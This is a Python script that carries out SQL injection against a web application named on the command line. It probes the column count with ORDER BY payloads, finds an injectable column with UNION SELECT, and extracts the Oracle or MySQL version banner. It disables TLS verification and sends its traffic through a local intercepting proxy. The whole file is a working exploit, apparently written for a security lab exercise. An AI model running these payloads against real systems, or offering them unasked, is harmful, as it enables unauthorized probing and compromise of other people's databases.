#!/usr/bin/env python3
# SQLi querying the database type and version on Oracle and MySQL.
import requests
import sys
from bs4 import BeautifulSoup

# Debugging
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def get_col(url):
    for i in range(1,10):
        sqli = f"' ORDER BY {i}-- "
        req = requests.get(url+sqli, verify=False, proxies=proxies)
        if "Internal Server Error" in req.text:
            return i-1
        i = i+1
    return False

def oracle_inject_col(url, number_col):
    for i in range(1,number_col+1):
        payload_list = ['NULL'] * number_col
        payload_list[i-1] = "'a'"
        sqli = f"' UNION SELECT {','.join(payload_list)} FROM dual--"
        req = requests.get(url+sqli, verify=False, proxies=proxies)
        if "Internal Server Error" not in req.text:
            return sqli
    return False

def oracle_get_version(url, sqli):
    sqli1 = sqli.replace("'a'", "BANNER")
    sqli2 = sqli1.replace("dual", "v$version")
    req = requests.get(url+sqli2, verify=False, proxies=proxies)
    if "Internal Server Error" not in req.text:
        soup = BeautifulSoup(req.text, 'html.parser')
        result = soup.find_all('th')
        return result[4]
    else:
        return False
    

def mysql_inject_col(url, number_col):
    for i in range(1,number_col+1):
        payload_list = ['NULL'] * number_col
        payload_list[i-1] = "'a'"
        sqli = f"' UNION SELECT {','.join(payload_list)}-- "
        req = requests.get(url+sqli, verify=False, proxies=proxies)
        if "Internal Server Error" not in req.text:
            return sqli
    return False

def mysql_get_version(url, sqli):
    sqli1 = sqli.replace("'a'", "@@version")
    req = requests.get(url+sqli1, verify=False, proxies=proxies)
    if "Internal Server Error" not in req.text:
        soup = BeautifulSoup(req.text, 'html.parser')
        result = soup.find_all('th')
        return result[-1]
    else:
        return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        database = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: {} <url> <database_name>".format(sys.argv[0]))
        print("[-] Usage: {} http://example.com oracle".format(sys.argv[0]))
        sys.exit(1)

    if database == "oracle":
        num_col = get_col(url)
        if num_col:
            print("[-] The number of columns is...       [{}]".format(num_col))
            inject_col = oracle_inject_col(url, num_col)
            if inject_col:
                print("[-] Found the injectable columns...   [{}]".format(inject_col))
                get_version = oracle_get_version(url, inject_col)
                if get_version:
                    print("[-] Found the version information...  [{}]".format(get_version))
                else:
                    print("[-] Can't find the version!")
            else:
                print("[-] Can't find injectable column!")
        else:
            print("[-] SQLi attack not successful!")

    if database == "mysql":
        num_col = get_col(url)
        if num_col:
            print("[-] The number of columns is...       [{}]".format(num_col))
            inject_col = mysql_inject_col(url, num_col)
            if inject_col:
                print("[-] Found the injectable columns...   [{}]".format(inject_col))
                get_version = mysql_get_version(url, inject_col)
                if get_version:
                    print("[-] Found the version information...  [{}]".format(get_version))
                else:
                    print("[-] Can't find the version!")
            else:
                print("[-] Can't find injectable column!")
        else:
            print("[-] SQLi attack not successful!")